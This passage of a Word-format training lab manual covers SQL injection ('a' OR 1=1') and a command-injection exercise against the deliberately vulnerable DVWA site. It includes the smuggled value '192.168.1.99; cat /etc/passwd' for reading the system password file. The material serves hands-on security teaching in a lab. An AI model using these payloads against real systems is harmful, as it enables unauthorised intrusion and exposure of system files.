                          <w:p w14:paraId="64453E60" w14:textId="77777777" w:rsidR="00C145DD" w:rsidRPr="00FA16E2" w:rsidRDefault="00C145DD" w:rsidP="00C145DD">
                            <w:pPr>
                              <w:rPr>
                                <w:sz w:val="14"/>
                              </w:rPr>
                            </w:pPr>
                            <w:r w:rsidRPr="00FA16E2">
                              <w:rPr>
                                <w:sz w:val="14"/>
                              </w:rPr>
                              <w:t>Whatever you type in the form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A5DB50D" id="_x0000_t202" coordsize="21600,21600" o:spt="202" path="m,l,21600r21600,l21600,xe">
                <v:stroke joinstyle="miter"/>
                <v:path gradientshapeok="t" o:connecttype="rect"/>
              </v:shapetype>
              <v:shape id="Text Box 20" o:spid="_x0000_s1026" type="#_x0000_t202" style="position:absolute;margin-left:234.8pt;margin-top:-4.3pt;width:115.6pt;height:23.65pt;z-index:25195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" fillcolor="white [3201]" strokeweight=".5pt">
                <v:textbox>
                  <w:txbxContent>
                    <w:p w14:paraId="64453E60" w14:textId="77777777" w:rsidR="00C145DD" w:rsidRPr="00FA16E2" w:rsidRDefault="00C145DD" w:rsidP="00C145DD">
                      <w:pPr>
                        <w:rPr>
                          <w:sz w:val="14"/>
                        </w:rPr>
                      </w:pPr>
                      <w:r w:rsidRPr="00FA16E2">
                        <w:rPr>
                          <w:sz w:val="14"/>
                        </w:rPr>
                        <w:t>Whatever you type in the form</w:t>
                      </w:r>
                    </w:p>
                  </w:txbxContent>
                </v:textbox>
              </v:shape>
            </w:pict>
          </mc:Fallback>
        </mc:AlternateContent>
      </w:r>
      <w:r w:rsidRPr="0062462C">
        <w:rPr>
          <w:rStyle w:val="QABlueWords"/>
        </w:rPr>
        <w:t xml:space="preserve">SELECT * FROM Users WHERE </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0062462C">
        <w:rPr>
          <w:rStyle w:val="QABlueWords"/>
        </w:rPr>
        <w:t>UserID</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0062462C">
        <w:rPr>
          <w:rStyle w:val="QABlueWords"/>
        </w:rPr>
        <w:t xml:space="preserve"> = '                                     '</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="08BF5F87" w14:textId="2AE39456" w:rsidR="00AB0BD6" w:rsidRDefault="00AB0BD6" w:rsidP="001F4164"/>
    <w:p w14:paraId="77BE69C7" w14:textId="0CB4B880" w:rsidR="00C145DD" w:rsidRDefault="00C145DD" w:rsidP="001F4164">
      <w:r>
        <w:t xml:space="preserve">When we enter </w:t>
      </w:r>
      <w:r w:rsidRPr="0062462C">
        <w:rPr>
          <w:rStyle w:val="QABlueWords"/>
        </w:rPr>
        <w:t>a' OR 1=1</w:t>
      </w:r>
      <w:r w:rsidR="0062462C">
        <w:t>, the same query will become</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1B0CF7F2" w14:textId="51242C4D" w:rsidR="0062462C" w:rsidRDefault="0062462C" w:rsidP="0062462C">
      <w:pPr>
        <w:rPr>
          <w:rStyle w:val="QABlueWords"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0062462C">
        <w:rPr>
          <w:rStyle w:val="QABlueWords"/>
        </w:rPr>
        <w:t xml:space="preserve">SELECT * FROM Users WHERE </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0062462C">
        <w:rPr>
          <w:rStyle w:val="QABlueWords"/>
        </w:rPr>
        <w:t>UserID</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0062462C">
        <w:rPr>
          <w:rStyle w:val="QABlueWords"/>
        </w:rPr>
        <w:t xml:space="preserve"> = 'a' OR 1=1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="73C461C2" w14:textId="4FE73CDF" w:rsidR="0062462C" w:rsidRDefault="0062462C" w:rsidP="0062462C">
      <w:pPr>
        <w:rPr>
          <w:rStyle w:val="QABlueWords"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0C16BA21" w14:textId="421B730B" w:rsidR="0062462C" w:rsidRDefault="0062462C" w:rsidP="001F4164">
      <w:r>
        <w:t>The MySQL server interprets a</w:t>
      </w:r>
      <w:r w:rsidRPr="0062462C">
        <w:t xml:space="preserve"> hashtag </w:t>
      </w:r>
      <w:r>
        <w:t># as the beginning of a comment, therefore we're essentially telling the database to ignore any character following the hashtag, so that we can get rid of the last single quote at the end of the form, and thus ensuring that our injected SQL query will run without any syntax errors.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="32193B13" w14:textId="4F18FA14" w:rsidR="00A36DFF" w:rsidRDefault="00A36DFF" w:rsidP="001F4164"/>
    <w:p w14:paraId="0C3EBB5E" w14:textId="485D300A" w:rsidR="00237DF5" w:rsidRDefault="00237DF5" w:rsidP="001F4164">
      <w:r>
        <w:t xml:space="preserve">Leave both the </w:t>
      </w:r>
      <w:r w:rsidRPr="00551340">
        <w:rPr>
          <w:rStyle w:val="QABold"/>
        </w:rPr>
        <w:t>Kali VM</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> and </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00551340">
        <w:rPr>
          <w:rStyle w:val="QABold"/>
        </w:rPr>
        <w:t>Metsaploitable</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00551340">
        <w:rPr>
          <w:rStyle w:val="QABold"/>
        </w:rPr>
        <w:t xml:space="preserve"> VM</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> running, we will need them again for the next exercise</w:t>
      </w:r>
      <w:r w:rsidR="007B41F3">
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="61309658" w14:textId="77777777" w:rsidR="00237DF5" w:rsidRDefault="00237DF5" w:rsidP="001F4164"/>
    <w:p w14:paraId="3B743810" w14:textId="083F2027" w:rsidR="00A36DFF" w:rsidRPr="00A36DFF" w:rsidRDefault="00A36DFF" w:rsidP="001F4164">
      <w:pPr>
        <w:rPr>
          <w:rStyle w:val="QABold"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00A36DFF">
        <w:rPr>
          <w:rStyle w:val="QABold"/>
        </w:rPr>
        <w:t xml:space="preserve">End of </w:t>
      </w:r>
      <w:r w:rsidR="0023150F">
        <w:rPr>
          <w:rStyle w:val="QABold"/>
        </w:rPr>
        <w:t>Lab</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3864330E" w14:textId="608ACD36" w:rsidR="007E0EF4" w:rsidRDefault="007E0EF4" w:rsidP="007E0EF4">
      <w:pPr>
        <w:pStyle w:val="QAHeadingH1Module"/>
      </w:pPr>
      <w:bookmarkStart w:id="3" w:name="_Toc21001231"/>
      <w:bookmarkStart w:id="4" w:name="_Toc24978028"/>
      <w:r w:rsidRPr="007F7488">
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">Lab </w:t>
      </w:r>
      <w:r w:rsidR="00161D02">
        <w:t>2</w:t>
      </w:r>
      <w:r w:rsidRPr="007F7488">
        <w:t xml:space="preserve">: </w:t>
      </w:r>
      <w:bookmarkEnd w:id="1"/>
      <w:r w:rsidR="00161D02">
        <w:t>Command Execution</w:t>
      </w:r>
      <w:bookmarkEnd w:id="3"/>
      <w:bookmarkEnd w:id="4"/>
    </w:p>
    <w:p w14:paraId="37D27DD2" w14:textId="77777777" w:rsidR="007E0EF4" w:rsidRDefault="007E0EF4" w:rsidP="007E0EF4">
      <w:pPr>
        <w:pStyle w:val="QAHeadingH3MajorSub-heading"/>
      </w:pPr>
      <w:r w:rsidRPr="007F7488">
        <w:t>Objective</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2131B510" w14:textId="190C3D92" w:rsidR="007E0EF4" w:rsidRDefault="007E0EF4" w:rsidP="007E0EF4">
      <w:r>
        <w:t xml:space="preserve">The objective of this exercise is to </w:t>
      </w:r>
      <w:r w:rsidR="00EF117D">
        <w:t xml:space="preserve">perform a command execution </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">attack on the DVWA </w:t>
      </w:r>
      <w:r w:rsidR="00EF117D">
        <w:t>website</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="05A2C071" w14:textId="4FBD5D95" w:rsidR="006D759D" w:rsidRDefault="006D759D" w:rsidP="007E0EF4"/>
    <w:p w14:paraId="2EBBEF40" w14:textId="25B2972A" w:rsidR="006D759D" w:rsidRDefault="006D759D" w:rsidP="006D759D">
      <w:pPr>
        <w:pStyle w:val="QAHeadingH3MajorSub-heading"/>
      </w:pPr>
      <w:r>
        <w:t>Resources</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4F5DF24F" w14:textId="4374ADBE" w:rsidR="006D759D" w:rsidRDefault="006D759D" w:rsidP="007E0EF4">
      <w:r>
        <w:t xml:space="preserve">For this exercise you will need the </w:t>
      </w:r>
      <w:r w:rsidRPr="00521A74">
        <w:rPr>
          <w:rStyle w:val="QABold"/>
        </w:rPr>
        <w:t>Kali VM</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> and </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00521A74">
        <w:rPr>
          <w:rStyle w:val="QABold"/>
        </w:rPr>
        <w:t>Metasploitable</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00521A74">
        <w:rPr>
          <w:rStyle w:val="QABold"/>
        </w:rPr>
        <w:t xml:space="preserve"> VM</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0AFBE89A" w14:textId="77777777" w:rsidR="007E0EF4" w:rsidRDefault="007E0EF4" w:rsidP="007E0EF4"/>
    <w:p w14:paraId="7D1721DA" w14:textId="77777777" w:rsidR="007E0EF4" w:rsidRDefault="007E0EF4" w:rsidP="007E0EF4">
      <w:pPr>
        <w:pStyle w:val="QAHeadingH3MajorSub-heading"/>
      </w:pPr>
      <w:r w:rsidRPr="007F7488">
        <w:t>Overview</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="079BE6BB" w14:textId="4150F5DE" w:rsidR="00FB5FF8" w:rsidRDefault="007E0EF4" w:rsidP="006D759D">
      <w:r>
        <w:t xml:space="preserve">We will be attempting a </w:t>
      </w:r>
      <w:r w:rsidR="006D759D">
        <w:t>command execution</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> attack </w:t>
      </w:r>
      <w:r w:rsidR="00237DF5">
        <w:t xml:space="preserve">through the DVWA website </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">to </w:t>
      </w:r>
      <w:r w:rsidR="006D759D">
        <w:t xml:space="preserve">force the web server to execute Operating System commands to read and display the contents of files and documents that reside outside of the web </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidR="006D759D">
        <w:t>root</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidR="006D759D">
        <w:t xml:space="preserve"> and which normally should not be accessible from the web.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3749C4AE" w14:textId="6F2BDD88" w:rsidR="002E0C78" w:rsidRDefault="002E0C78" w:rsidP="002E0C78">
      <w:pPr>
        <w:pStyle w:val="QAHeadingH3MajorSub-heading"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2B7553B4" w14:textId="1ECC80BE" w:rsidR="00237DF5" w:rsidRDefault="007E0EF4" w:rsidP="001A3DAC">
      <w:pPr>
        <w:pStyle w:val="QAHeadingH3MajorSub-heading"/>
      </w:pPr>
      <w:r w:rsidRPr="007F7488">
        <w:t xml:space="preserve">Step 1: </w:t>
      </w:r>
      <w:r>
        <w:t>Load the Virtual Machines</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6EDF5906" w14:textId="3C5D7995" w:rsidR="007B41F3" w:rsidRDefault="007B41F3" w:rsidP="007B41F3">
      <w:r>
        <w:t xml:space="preserve">The </w:t>
      </w:r>
      <w:r w:rsidRPr="007B41F3">
        <w:rPr>
          <w:rStyle w:val="QABold"/>
        </w:rPr>
        <w:t>Kali VM</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> and </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="007B41F3">
        <w:rPr>
          <w:rStyle w:val="QABold"/>
        </w:rPr>
        <w:t>Metasploitable</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="007B41F3">
        <w:rPr>
          <w:rStyle w:val="QABold"/>
        </w:rPr>
        <w:t xml:space="preserve"> VM</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> should still be running from the previous exercise. If they are not, then start them up by double-clicking on each VM in the Hyper-V Manager and press "Start" in the windows that will appear.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C8B4411" w14:textId="3A07876F" w:rsidR="007E0EF4" w:rsidRPr="00825763" w:rsidRDefault="007E0EF4" w:rsidP="007E0EF4"/>
    <w:p w14:paraId="35BF2A46" w14:textId="23784B4F" w:rsidR="007E0EF4" w:rsidRDefault="007E0EF4" w:rsidP="007E0EF4">
      <w:pPr>
        <w:pStyle w:val="QAHeadingH3MajorSub-heading"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Step 2: </w:t>
      </w:r>
      <w:r w:rsidR="00DA02B8">
        <w:t>Navigate to the</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> DVWA </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidR="00DA02B8">
        <w:t>website</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="63AFFACD" w14:textId="05A97E67" w:rsidR="0021313D" w:rsidRPr="0021313D" w:rsidRDefault="00DA02B8" w:rsidP="0021313D">
      <w:r>
        <w:t xml:space="preserve">In the </w:t>
      </w:r>
      <w:r w:rsidRPr="006A0C45">
        <w:rPr>
          <w:rStyle w:val="QABold"/>
        </w:rPr>
        <w:t>Kali VM</w:t>
      </w:r>
      <w:r>
        <w:t>, launch the Firefox browser</w:t>
      </w:r>
      <w:r w:rsidR="0021313D">
        <w:t xml:space="preserve">. </w:t>
      </w:r>
      <w:r w:rsidR="0021313D" w:rsidRPr="0021313D">
        <w:t>In Firefox, type the following address in the address bar to navigate to the DVWA's login page</w:t>
      </w:r>
      <w:r w:rsidR="0021313D">
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="71356356" w14:textId="06246E99" w:rsidR="0021313D" w:rsidRPr="0021313D" w:rsidRDefault="0021313D" w:rsidP="0021313D">
      <w:pPr>
        <w:pStyle w:val="QACodeSegment"/>
      </w:pPr>
      <w:r w:rsidRPr="0021313D">
        <w:t>http://192.168.1.99/dvwa</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="42D587D9" w14:textId="77777777" w:rsidR="0021313D" w:rsidRDefault="0021313D" w:rsidP="0021313D"/>
    <w:p w14:paraId="0BD09F73" w14:textId="7EE56EB8" w:rsidR="0021313D" w:rsidRPr="0021313D" w:rsidRDefault="0021313D" w:rsidP="0021313D">
      <w:r w:rsidRPr="0021313D">
        <w:t>Login to the DVWA website using the following credentials:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D81C3EF" w14:textId="77777777" w:rsidR="0021313D" w:rsidRPr="0021313D" w:rsidRDefault="0021313D" w:rsidP="0021313D">
      <w:pPr>
        <w:pStyle w:val="QACodeSegment"/>
      </w:pPr>
      <w:r w:rsidRPr="0021313D">
        <w:t>Username: admin</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="56469AC3" w14:textId="77777777" w:rsidR="0021313D" w:rsidRPr="0021313D" w:rsidRDefault="0021313D" w:rsidP="0021313D">
      <w:pPr>
        <w:pStyle w:val="QACodeSegment"/>
      </w:pPr>
      <w:r w:rsidRPr="0021313D">
        <w:t>Password: password</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4209DD0A" w14:textId="1B173A6F" w:rsidR="001B796B" w:rsidRDefault="001B796B" w:rsidP="001B796B"/>
    <w:p w14:paraId="417C7C80" w14:textId="5B4BC41B" w:rsidR="00F06FD9" w:rsidRPr="00F06FD9" w:rsidRDefault="00F06FD9" w:rsidP="00F06FD9">
      <w:r w:rsidRPr="00F06FD9">
        <w:t>Once logged in, click on the "</w:t>
      </w:r>
      <w:r w:rsidRPr="00F06FD9">
        <w:rPr>
          <w:rStyle w:val="QABold"/>
        </w:rPr>
        <w:t>DVWA Security</w:t>
      </w:r>
      <w:r w:rsidRPr="00F06FD9">
        <w:t>" button on the left-hand sidebar</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> and set the security to "Low" then click "Submit" to save the changes.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="50C4B572" w14:textId="58A010BE" w:rsidR="00F06FD9" w:rsidRDefault="00F06FD9">
      <w:pPr>
        <w:spacing w:before="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI Light" w:hAnsi="Segoe UI Light"/>
          <w:color w:val="005BAA"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0993D7C5" w14:textId="77777777" w:rsidR="00FB218D" w:rsidRDefault="00FB218D">
      <w:pPr>
        <w:spacing w:before="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI Light" w:hAnsi="Segoe UI Light"/>
          <w:color w:val="005BAA"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="02819D19" w14:textId="504531C9" w:rsidR="007E0EF4" w:rsidRPr="00825763" w:rsidRDefault="007E0EF4" w:rsidP="007E0EF4">
      <w:pPr>
        <w:pStyle w:val="QAHeadingH3MajorSub-heading"/>
      </w:pPr>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">Step 3: </w:t>
      </w:r>
      <w:r w:rsidR="00CC1654">
        <w:t xml:space="preserve">Conduct the Command Execution </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidR="00CC1654">
        <w:t>attack</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="6AEA8EC3" w14:textId="16D3D78F" w:rsidR="00CC1654" w:rsidRPr="00CC1654" w:rsidRDefault="00CC1654" w:rsidP="00CC1654">
      <w:r w:rsidRPr="00CC1654">
        <w:t>Click the “</w:t>
      </w:r>
      <w:r w:rsidRPr="00CC1654">
        <w:rPr>
          <w:rStyle w:val="QABold"/>
        </w:rPr>
        <w:t>Command Execution</w:t>
      </w:r>
      <w:r w:rsidRPr="00CC1654">
        <w:t xml:space="preserve">” button on the left-hand sidebar. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4373CC58" w14:textId="07C95BB0" w:rsidR="00CC1654" w:rsidRDefault="00CC1654" w:rsidP="00CC1654">
      <w:r w:rsidRPr="00CC1654">
        <w:t xml:space="preserve">We are going to do a ping test using the web interface. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="52CF2E7A" w14:textId="7136D95B" w:rsidR="00FB218D" w:rsidRDefault="00FB218D" w:rsidP="00CC1654"/>
    <w:p w14:paraId="603D6C7F" w14:textId="716FBB88" w:rsidR="00FB218D" w:rsidRPr="00CC1654" w:rsidRDefault="00FB218D" w:rsidP="00CC1654">
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <mc:AlternateContent>
          <mc:Choice Requires="wps">
            <w:drawing>
              <wp:anchor distT="0" distB="0" distL="114300" distR="114300" simplePos="0" relativeHeight="251958272" behindDoc="0" locked="0" layoutInCell="1" allowOverlap="1" wp14:anchorId="667A4BBC" wp14:editId="503CB92A">
                <wp:simplePos x="0" y="0"/>
                <wp:positionH relativeFrom="column">
                  <wp:posOffset>821709</wp:posOffset>
                </wp:positionH>
                <wp:positionV relativeFrom="paragraph">
                  <wp:posOffset>1083606</wp:posOffset>
                </wp:positionV>
                <wp:extent cx="687468" cy="45719"/>
                <wp:effectExtent l="50800" t="63500" r="49530" b="81915"/>
                <wp:wrapNone/>
                <wp:docPr id="23" name="Straight Arrow Connector 23"/>
                <wp:cNvGraphicFramePr/>
                <a:graphic xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
                  <a:graphicData uri="http://schemas.microsoft.com/office/word/2010/wordprocessingShape">
                    <wps:wsp>
                      <wps:cNvCnPr/>
                      <wps:spPr>
                        <a:xfrm flipH="1" flipV="1">
                          <a:off x="0" y="0"/>
                          <a:ext cx="687468" cy="45719"/>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1BC9C3" id="Straight Arrow Connector 23" o:spid="_x0000_s1026" type="#_x0000_t32" style="position:absolute;margin-left:64.7pt;margin-top:85.3pt;width:54.15pt;height:3.6pt;flip:x y;z-index:25195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" strokecolor="#ca1e17 [3205]" strokeweight="2pt">
                <v:stroke endarrow="block"/>
                <v:shadow on="t" color="black" opacity="24903f" origin=",.5" offset="0,.55556mm"/>
              </v:shape>
            </w:pict>
          </mc:Fallback>
        </mc:AlternateContent>
      </w:r>
      <w:r w:rsidRPr="00FB218D">
        <w:rPr>
          <w:noProof/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="7DA562D1" wp14:editId="4A869572">
            <wp:extent cx="3931252" cy="2201159"/>
            <wp:effectExtent l="0" t="0" r="635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936794" cy="2204262"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="450475EA" w14:textId="77777777" w:rsidR="00CC1654" w:rsidRDefault="00CC1654" w:rsidP="00CC1654"/>
    <w:p w14:paraId="4C732F66" w14:textId="58014D6F" w:rsidR="00CC1654" w:rsidRPr="00CC1654" w:rsidRDefault="00CC1654" w:rsidP="00CC1654">
      <w:r w:rsidRPr="00CC1654">
        <w:t xml:space="preserve">Type: </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="79EE3750" w14:textId="77777777" w:rsidR="00CC1654" w:rsidRPr="00CC1654" w:rsidRDefault="00CC1654" w:rsidP="00345F9D">
      <w:pPr>
        <w:pStyle w:val="QACodeSegment"/>
      </w:pPr>
      <w:r w:rsidRPr="00CC1654">
        <w:t>192.168.1.99</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="42CD0168" w14:textId="45104003" w:rsidR="00CC1654" w:rsidRDefault="00CC1654" w:rsidP="00CC1654">
      <w:r w:rsidRPr="00CC1654">
        <w:t xml:space="preserve">Click </w:t>
      </w:r>
      <w:r w:rsidR="00345F9D">
        <w:t>"</w:t>
      </w:r>
      <w:r w:rsidRPr="00CC1654">
        <w:t>Submit</w:t>
      </w:r>
      <w:r w:rsidR="00345F9D">
        <w:t>"</w:t>
      </w:r>
      <w:r w:rsidRPr="00CC1654">
        <w:t xml:space="preserve">. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="60241771" w14:textId="38D200FA" w:rsidR="00345F9D" w:rsidRDefault="00021237" w:rsidP="00CC1654">
      <w:r w:rsidRPr="00021237">
        <w:rPr>
          <w:noProof/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="6B7C4EB5" wp14:editId="1DBDAC99">
            <wp:extent cx="4211579" cy="2358116"/>
            <wp:effectExtent l="0" t="0" r="508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228179" cy="2367410"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="2AB9D6BC" w14:textId="10932CA5" w:rsidR="00345F9D" w:rsidRDefault="00345F9D" w:rsidP="00CC1654"/>
    <w:p w14:paraId="755F800F" w14:textId="226A6D8F" w:rsidR="00021237" w:rsidRPr="00021237" w:rsidRDefault="00021237" w:rsidP="00021237">
      <w:r w:rsidRPr="00021237">
        <w:t xml:space="preserve">Now </w:t>
      </w:r>
      <w:r>
        <w:t>let's</w:t>
      </w:r>
      <w:r w:rsidRPr="00021237">
        <w:t xml:space="preserve"> read the password file. Type: </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6BC0BB4E" w14:textId="77777777" w:rsidR="00021237" w:rsidRPr="00021237" w:rsidRDefault="00021237" w:rsidP="00021237">
      <w:pPr>
        <w:pStyle w:val="QACodeSegment"/>
      </w:pPr>
      <w:r w:rsidRPr="00021237">
        <w:t>cat /etc/passwd</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C9F3EF5" w14:textId="3984071F" w:rsidR="00021237" w:rsidRDefault="00021237" w:rsidP="00021237">
      <w:r w:rsidRPr="00021237">
        <w:t xml:space="preserve">Click </w:t>
      </w:r>
      <w:r>
        <w:t>"</w:t>
      </w:r>
      <w:r w:rsidRPr="00021237">
        <w:t>Submit</w:t>
      </w:r>
      <w:r>
        <w:t>"</w:t>
      </w:r>
      <w:r w:rsidRPr="00021237">
        <w:t xml:space="preserve">. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="02513449" w14:textId="3AADE7B8" w:rsidR="00021237" w:rsidRPr="00021237" w:rsidRDefault="00021237" w:rsidP="00021237">
      <w:r w:rsidRPr="00021237">
        <w:t xml:space="preserve">Notice that either a message saying illegal IP address was displayed or nothing was returned. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="640ED9A2" w14:textId="77777777" w:rsidR="007C61DE" w:rsidRDefault="007C61DE">
      <w:pPr>
        <w:spacing w:before="0"/>
      </w:pPr>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="004F8FDE" w14:textId="191209CE" w:rsidR="00021237" w:rsidRPr="00021237" w:rsidRDefault="00021237" w:rsidP="00021237">
      <w:r w:rsidRPr="00021237">
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">Now type: </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="074EE5BC" w14:textId="77777777" w:rsidR="00021237" w:rsidRPr="00021237" w:rsidRDefault="00021237" w:rsidP="007C61DE">
      <w:pPr>
        <w:pStyle w:val="QACodeSegment"/>
      </w:pPr>
      <w:r w:rsidRPr="00021237">
        <w:t>192.168.1.99; cat /etc/passwd</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="77775EFD" w14:textId="28C005BA" w:rsidR="007C61DE" w:rsidRDefault="00021237" w:rsidP="00021237">
      <w:r w:rsidRPr="00021237">
        <w:t xml:space="preserve">Click </w:t>
      </w:r>
      <w:r w:rsidR="007C61DE">
        <w:t>"</w:t>
      </w:r>
      <w:r w:rsidRPr="00021237">
        <w:t>Submit</w:t>
      </w:r>
      <w:r w:rsidR="007C61DE">
        <w:t>"</w:t>
      </w:r>
      <w:r w:rsidRPr="00021237">
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="78D01C9A" w14:textId="6D33CE1F" w:rsidR="00021237" w:rsidRPr="00021237" w:rsidRDefault="00021237" w:rsidP="00021237">
      <w:r w:rsidRPr="00021237">
        <w:t xml:space="preserve">Notice that we are now able to see the contents of the /etc/passwd file. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="79247F38" w14:textId="4A846837" w:rsidR="00021237" w:rsidRPr="00CC1654" w:rsidRDefault="007C61DE" w:rsidP="00CC1654">
      <w:r w:rsidRPr="007C61DE">
        <w:rPr>
          <w:noProof/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="549ED7A7" wp14:editId="62DAD3EC">
            <wp:extent cx="6120765" cy="3427095"/>
            <wp:effectExtent l="0" t="0" r="635"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120765" cy="3427095"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A2EE17A" w14:textId="77777777" w:rsidR="000930F8" w:rsidRDefault="000930F8" w:rsidP="007E0EF4">
      <w:pPr>
        <w:rPr>
          <w:rStyle w:val="QABold"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="268EA0C9" w14:textId="77777777" w:rsidR="0023150F" w:rsidRPr="00CD0EA2" w:rsidRDefault="0023150F" w:rsidP="0023150F">
      <w:pPr>
        <w:rPr>
          <w:rStyle w:val="QABold"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00CD0EA2">
        <w:rPr>
          <w:rStyle w:val="QABold"/>
        </w:rPr>
        <w:t xml:space="preserve">End of </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="QABold"/>
        </w:rPr>
        <w:t>Lab</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="78C13156" w14:textId="77777777" w:rsidR="0023150F" w:rsidRDefault="0023150F" w:rsidP="007E0EF4">
      <w:pPr>
        <w:rPr>
          <w:rStyle w:val="QABold"/>
